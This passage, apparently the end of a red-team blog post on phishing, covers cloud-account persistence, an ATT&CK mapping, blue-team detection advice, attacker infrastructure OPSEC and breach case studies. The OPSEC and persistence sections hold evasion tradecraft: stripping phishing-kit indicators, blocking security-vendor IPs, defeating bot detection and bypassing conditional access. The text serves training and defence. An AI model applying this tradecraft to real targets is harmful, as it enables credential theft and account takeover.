**Phase 5 — Persist:** Register Consent Grant app for persistent Graph API access. Use refresh tokens to maintain access across session expiry. Register a new device in Azure AD for device-based conditional access bypass.

**Phase 6 — Post-Access:** Enumerate mailbox, SharePoint, OneDrive. Map internal org structure. Identify high-value targets for lateral movement. Document everything with timestamps and screenshots.

---

## Part 5: MITRE ATT&CK Mapping

Every technique in this post maps to ATT&CK for engagement documentation and reporting.

| Technique | ATT&CK ID | Tactic | Description |
|---|---|---|---|
| Email Phishing (Link) | T1566.002 | Initial Access | Spearphishing link |
| AiTM / Evilginx | T1557.003 | Credential Access | Adversary-in-the-Middle |
| Device Code Phishing | T1528 | Credential Access | Steal Application Access Token |
| Consent Grant | T1098.003 | Persistence | Additional Cloud Credentials — OAuth App |
| Session Cookie Theft | T1539 | Credential Access | Steal Web Session Cookie |
| Token Manipulation | T1134 | Privilege Escalation | Access Token Manipulation |
| ClickFix / FileFix | T1204.001 | Execution | User Execution — Malicious Link |
| HTA Execution | T1218.005 | Defense Evasion | System Binary Proxy Execution — Mshta |
| MFA Downgrade | T1556.006 | Credential Access | Modify Authentication Process — MFA |
| Drive-By Download | T1189 | Initial Access | Drive-by Compromise |
| Credential Harvesting | T1056.003 | Collection | Input Capture — Web Portal Capture |

---

## Part 6: Detection Opportunities — For the Blue Team

Every technique has detection surface. Here's what defenders should monitor.

### Device Code Phishing Detection

- **Azure AD Sign-in Logs:** Filter for `authenticationProtocol == deviceCode`. Legitimate device code usage is rare in most environments — any occurrence should be investigated.
- **Conditional Access:** Create a policy that blocks or requires additional verification for device code authentication flows.
- **Anomalous Token Usage:** Alert when access tokens from device code flow are used from an IP address or geography that doesn't match the user's authentication location.

### MFA Downgrade Detection

- **Authentication Method Analysis:** Monitor for users who normally authenticate with FIDO2 suddenly falling back to TOTP or push notification.
- **User-Agent Anomalies:** The MFA Downgrade worker replaces the UA with a non-standard string. Correlate authentication UAs with the user's known browser profile.
- **Conditional Access:** Enforce "Require authentication strength" policies that mandate FIDO2 for privileged accounts — making downgrade impossible.

### Consent Grant Detection

- **Azure AD Audit Logs:** Monitor for `Consent to application` events, especially for applications with broad scopes (Mail.Read, Files.ReadWrite, Mail.Send).
- **Application Governance:** Deploy Microsoft Defender for Cloud Apps to detect OAuth apps with overpermissioned scopes.
- **Restrict User Consent:** Configure Azure AD to require admin approval for all third-party application consent requests.

### LOU Technique Detection

- **PowerShell Logging:** Enable ScriptBlock logging and Module logging. ClickFix payloads executed via Run dialog will appear in PowerShell logs.
- **Clipboard Monitoring:** EDR solutions that monitor clipboard write events from browser processes can detect ClickFix's `navigator.clipboard.writeText()`.
- **Process Creation Monitoring:** Alert on `cmd.exe` or `powershell.exe` spawned from `explorer.exe` with suspicious command-line arguments — indicative of FileFix.

### Session Cookie Theft Detection

- **Impossible Travel:** Alert when a session cookie is used from a location that's geographically impossible given the user's last known authentication location.
- **Token Replay Detection:** Azure AD's continuous access evaluation (CAE) can detect and revoke tokens that appear to be replayed from unexpected contexts.
- **Device Compliance:** Require device compliance checks for session tokens — stolen cookies replayed from unmanaged devices will fail.

---

## Part 7: Infrastructure OPSEC — Brief Notes

Every technique in this post requires supporting infrastructure. The OPSEC fundamentals:

- **Domain aging:** Purchase domains 14+ days before engagement. Enable WHOIS privacy. Avoid phishing keywords in domain names.
- **Email authentication:** SPF + DKIM + DMARC must be properly configured and aligned. Test with mail-tester.com (target score >7/10).
- **TLS:** LetsEncrypt minimum. Cloudflare-managed certs preferred. Never self-signed.
- **GoPhish OPSEC:** Remove all default IOCs — X-Mailer headers, default landing page signatures, tracking paths. Bind management panel to localhost only.
- **Evilginx OPSEC:** Remove default response headers. IP-restrict management access. Block known security vendor IP ranges.
- **Bot detection evasion:** Implement User-Agent filtering, CAPTCHA challenges, JavaScript viewport checks, mouse movement detection, and delayed page activation.
- **Serverless deployment:** Cloudflare Workers, AWS Lambda, and Azure Functions reduce static infrastructure footprint — no persistent server to fingerprint or take down.

---

## Real-World Case Studies

### MGM Resorts (2023) — Scattered Spider + ALPHV

Scattered Spider (UNC3944) used vishing (voice phishing) to social-engineer MGM's IT Help Desk into resetting an employee's MFA and password. From there: Okta tenant compromised → Entra ID breached → Super Admin privileges escalated → 6 TB data exfiltrated → 100+ ESXi hypervisors encrypted with ALPHV ransomware. **$100M financial impact.** The entire attack chain started with a phone call. No malware delivery needed — they lived off the help desk's trust.

### Deepfake CEO Wire Fraud (2025) — AI-Powered BEC

Attackers combined AI voice cloning (ElevenLabs) with AiTM phishing and MFA fatigue to compromise a CFO's mailbox. They then conducted a live Zoom call using deepfake audio of the CEO's voice to authorize two wire transfers totaling $2.3M. Thread hijacking on existing Outlook conversations and an OAuth consent grant for persistent access completed the attack chain. **First confirmed real-time AI voice BEC.**

---

## Closing Thoughts

The phishing landscape has shifted irreversibly. Credentials are a means to an end, but tokens, sessions, and consent grants are the actual prize. Living-Off-the-User techniques eliminate the need for malware entirely — the user's own actions become the attack vector, and legitimate OS and browser functions become the execution engine.

For red team operators: master the decision matrix. Know when to use AiTM vs Device Code vs MFA Downgrade. Chain techniques together. Build modular infrastructure that survives burning.

For defenders: the detection opportunities exist at every stage. Device Code flow monitoring, consent grant governance, authentication method analysis, and continuous access evaluation are your highest-ROI controls. If you're not monitoring these today, start.

The attackers already have.

---

## References

1. **CyberWarFare Labs (CWL)** — Certified Offensive Phishing Operator (COPO) course material and tooling
2. **MITRE ATT&CK Framework** — [attack.mitre.org](https://attack.mitre.org/)
3. **Microsoft Security** — [OAuth 2.0 Device Code Flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code)
4. **Microsoft Security** — [Detecting Illicit Consent Grants](https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-app-consent)
5. **mr.d0x** — Browser-in-the-Browser (BiTB) original research
6. **Proofpoint** — ClickFix social engineering research
7. **Mandiant** — Scattered Spider (UNC3944) threat intelligence
8. **Evilginx** — [github.com/kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)
9. **GoPhish** — [github.com/gophish/gophish](https://github.com/gophish/gophish)

---

*— 0xNegan*

*LinkedIn: [YOUR_LINKEDIN_PLACEHOLDER]*  
*Telegram: Macro*  
*YouTube: [@negansec](https://youtube.com/@negansec)*  
*Medium: [@CipherHawk](https://medium.com/@CipherHawk/)*
